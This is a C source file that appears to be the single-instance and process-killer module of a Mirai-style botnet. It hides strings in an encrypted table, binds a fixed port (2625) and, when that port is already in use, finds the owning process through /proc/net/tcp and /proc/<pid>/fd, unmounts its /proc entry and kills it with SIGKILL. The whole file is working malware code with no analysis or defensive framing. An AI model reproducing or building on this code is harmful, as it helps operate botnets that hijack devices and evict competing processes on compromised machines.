#define _GNU_SOURCE
#define SINGLE_INSTANCE_PORT 2625

#include <arpa/inet.h>
#include "bool.h"
#include "dbg.h"

#ifdef ENSURE_NEW

#include <fcntl.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>
#include <signal.h>
#include <sys/mount.h>
#include "util.h"
#include "table.h"

static uint8_t ensure_table_vals[] = {
    TABLE_KILLER_PROC,
    TABLE_KILLER_STDIN,
    TABLE_ENSURE_SOCKET
};

typedef struct {
    char *inode;
} inode_t;

static int inode_index = 0;
static inode_t *inode_list = NULL;

static char int_to_hex(int i) {

	return i < 10 ? '0' + i : 'A' - 10 + i;
}

static char *get_inode(char *buf) {

    int len = strlen(buf);

    for (int i = 91; i < len; i++) {
        if (buf[i] == ' ') {
            buf[i] = 0;
            return buf + 91;
        }
    }

    return NULL;
}

static char *get_port(char *buf) {

	int len = strlen(buf);

	for (int i = 15; i < len; i++) {
		if (buf[i] == ' ') {
			buf[i] = 0;
			return buf + 15;
		}
	}

	return NULL;
}

static void append_inode(char *inode) {

    inode_list = realloc(inode_list, (inode_index + 1) * sizeof(inode_t));
    inode_list[inode_index++].inode = strdup(inode);
}

static BOOL fine_inode(char *inode) {

    for (int i = 0; i < inode_index; i++) {
        if (!strcmp(inode, inode_list[i].inode))
            return TRUE;
    }

    return FALSE;
}

static BOOL check_for_socket(char *path) {

    int len;
    char rdbuf[32] = {0};

    if ((len = readlink(path, rdbuf, sizeof(rdbuf) - 1)) == -1)
        return FALSE;

    if (!strncmp(rdbuf, table[TABLE_ENSURE_SOCKET].str, table[TABLE_ENSURE_SOCKET].len)) {
        rdbuf[len - 1] = 0;
            
        if (fine_inode(rdbuf + table[TABLE_ENSURE_SOCKET].len))
            return TRUE;
    }

    return FALSE;
}

static BOOL check_fd_path(char *pid) {

    char fd_path[32] = {0};

    strcpy(fd_path, table[TABLE_KILLER_PROC].str);
    strcat(fd_path, pid);

    umount(fd_path); /* /proc/pid */
    strncat(fd_path, table[TABLE_KILLER_STDIN].str, 4);

    DIR *dir = opendir(fd_path);

    if (!dir)
        return FALSE;

    BOOL found = FALSE;
    struct dirent *entry;
    char rdpath[32] = {0};

    while ((entry = readdir(dir))) {
        if (*entry->d_name == '.')
            continue;

        strcpy(rdpath, fd_path);
        strcat(rdpath, entry->d_name);

        if (check_for_socket(rdpath)) {
            found = TRUE;
            break;
        }
    }

    return found;
}

static BOOL kill_port(int port) {

    char hex_port[8] = {0};

    for (int i = 0; i < 4; i++)
	hex_port[i] = int_to_hex(port >> (12 - i * 4) & 0xF);

    DEBUG_PRINT("[kill_port] checking for process bound to port: (\'%d\') | hex_port: (\"%s\")\n", port, hex_port);

    table_unlock_val(TABLE_ENSURE_TCP);
    int fd = open(table[TABLE_ENSURE_TCP].str, O_RDONLY);
    table_lock_val(TABLE_ENSURE_TCP);

    if (fd == -1)
        return FALSE;

    while (TRUE) {
        char rdbuf[256] = {0};

        if (util_read(fd, rdbuf, sizeof(rdbuf)) == NULL)
            break;

        if (rdbuf[35] == 'A') {
            char *inode = get_inode(rdbuf);

            if (!inode)
                continue;

            char *inode_port = get_port(rdbuf);

            if (!inode_port)
                continue;

            if (!strcmp(hex_port, inode_port))
                append_inode(inode);
        }
    }

    close(fd);

#ifdef DEBUG
    for (int i = 0; i < inode_index; i++)
        DEBUG_PRINT("[kill_port] inode_list[%d].inode: (%s)\n", i, inode_list[i].inode);
#endif

    table_unlock_val(TABLE_KILLER_PROC);
    DIR *dir = opendir(table[TABLE_KILLER_PROC].str);
    table_lock_val(TABLE_KILLER_PROC);

    if (!dir)
        return FALSE;

    BOOL found = FALSE;
    struct dirent *entry;

    for (unsigned int i = 0; i < (sizeof(ensure_table_vals) / sizeof(ensure_table_vals[0])); i++)
        table_unlock_val(ensure_table_vals[i]);

    while ((entry = readdir(dir))) {
        if (*entry->d_name >= '0' && *entry->d_name <= '9') {
            if (check_fd_path(entry->d_name)) {
                DEBUG_PRINT("[kill_port] killing pid: (%s)\n", entry->d_name);
                kill(atoi(entry->d_name), SIGKILL);
                found = TRUE;
                break;
            }
        }
    }

    for (unsigned int i = 0; i < (sizeof(ensure_table_vals) / sizeof(ensure_table_vals[0])); i++)
        table_lock_val(ensure_table_vals[i]);

    for (int i = 0; i < inode_index; i++)
        free(inode_list[i].inode);

    free(inode_list);

    closedir(dir);
    return found;
}

#endif

BOOL ensure_single_instance(void) {

    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd == -1) {
        DEBUG_PRINT("[ensure_single_instance] socket() failed\n");
        return FALSE;
    }

    if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int)) == -1) {
        DEBUG_PRINT("[ensure_single_instance] setsockopt() failed\n");
        return FALSE;
    }

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(SINGLE_INSTANCE_PORT),
        .sin_addr.s_addr = INADDR_ANY
    };

    if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
        DEBUG_PRINT("[ensure_single_instance] failed to bind() to port: (\'%d\')\n", SINGLE_INSTANCE_PORT);

        #ifdef ENSURE_NEW

            if (!kill_port(SINGLE_INSTANCE_PORT)) {
                DEBUG_PRINT("[ensure_single_instance] failed to kill process bound to port: (\'%d\')\n", SINGLE_INSTANCE_PORT);
                return FALSE;
            }

            DEBUG_PRINT("[ensure_single_instance] successfully killed process bound to port: (\'%d\')\n", SINGLE_INSTANCE_PORT);

            sleep(5);

            if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
                DEBUG_PRINT("[ensure_single_instance] failed to bind() to port: (\'%d\')\n", SINGLE_INSTANCE_PORT);
                return FALSE;
            }

	#else
            return FALSE;
        #endif
    }

    if (listen(fd, 1) == -1) {
        DEBUG_PRINT("[ensure_single_instance] listen() failed\n");
        return FALSE;
    }

    DEBUG_PRINT("[ensure_single_instance] successfully bound to port: (\'%d\')\n", SINGLE_INSTANCE_PORT);
    return TRUE;
}
